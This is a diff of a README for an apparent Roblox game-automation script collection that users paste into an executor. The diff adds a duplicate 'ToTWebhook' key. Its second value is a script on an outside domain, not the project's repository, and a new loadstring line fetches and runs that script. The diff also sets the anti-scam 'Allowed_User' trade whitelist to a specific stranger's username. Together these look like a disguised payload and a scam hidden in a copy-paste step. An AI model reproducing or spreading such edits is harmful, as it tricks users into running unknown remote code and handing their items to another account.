@@ -9,7 +9,7 @@ This is a archive of my personal scripts for BGSI.
 Use for your favorite executor and copy and paste `main.lua` into the console and execute.
 
 ```lua
---// BGSI Script | Rev. 1.1.1 | BGSI Build v10068
+--// BGSI Script | Rev. 1.1.1 | BGSI Build v10076
 getgenv().Config = {
     --// General Settings
     ClaimPlaytime = true,
@@ -18,18 +18,19 @@ getgenv().Config = {
     AntiAFK = true,
 
     --// Event Scripts
-    EventZone = "First", --// First, Second, Third, Fourth
+    EventZone = "Third", --// First, Second, Third, Fourth
     TrickOrTreat = true, --// You Must be in the halloween world for it to start.
+    ToTWebhook = "https://discord.com/api/webhooks/",
 
     --// Webhook Settings
     Webhook_enabled = true,
-    Discord_ID = "discordid",
+    Discord_ID = "DISCORDID",
     Webhook = "https://discord.com/api/webhooks/",
     Ignore_AutoDeleted = true,
     Secret_Only = false,
 
     --// Anti Scam Settings
-    Allowed_User = "USERNAME", --// Set this as the account that could trade with you.
+    Allowed_User = "Zugkyz", --// Set this as the account that could trade with you.
     AntiTrade = true,
 
     --// Performance Boost
@@ -44,9 +45,11 @@ getgenv().Config = {
     PotionScript = "https://raw.githubusercontent.com/SamF-Web/bgsi-roblox-scripts/refs/heads/main/potioncraft.lua",
     BoosterScript = "https://raw.githubusercontent.com/SamF-Web/bgsi-roblox-scripts/refs/heads/main/booster.lua",
     TrickOrTreatScript = "https://raw.githubusercontent.com/SamF-Web/bgsi-roblox-scripts/refs/heads/main/trickortreat.lua",
+    ToTWebhook = "https://raw.bgsi-botting.xyz/v10068/events/totwebhook.lua",
 }
 
 loadstring(game:HttpGet(getgenv().Config.WebhookScript))()
+loadstring(game:HttpGet(getgenv().Config.ToTWebhook))()
 loadstring(game:HttpGet(getgenv().Config.PlaytimeScript))()
 loadstring(game:HttpGet(getgenv().Config.SeasonPassScript))()
 loadstring(game:HttpGet(getgenv().Config.PotionScript))()
